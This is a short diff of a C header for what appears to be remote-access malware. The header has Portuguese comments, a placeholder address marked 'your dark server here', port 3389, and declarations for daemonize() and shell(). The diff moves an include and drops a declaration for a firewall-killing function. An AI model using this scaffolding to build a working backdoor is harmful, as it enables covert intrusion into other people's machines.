@@ -1,8 +1,6 @@
 #ifndef _MAIN_H
 #define _MAIN_H
 
-#include "execfuncs.h"
-
 /* Basic libraries */
 
 #include <stdio.h>
@@ -32,10 +30,12 @@
 #define remote_addr "0.0.0.0" /* your dark server here */
 #define remote_port 3389
 
-// Declarações de funções que serão implementadas de forma diferente
+// Inclui as declarações das outras partes do programa
+#include "execfuncs.h"
+
+// Declarações de funções com implementações específicas por plataforma
 void daemonize();
 void shell();
-int kill_frwl();
 
 //#define focusWin
 
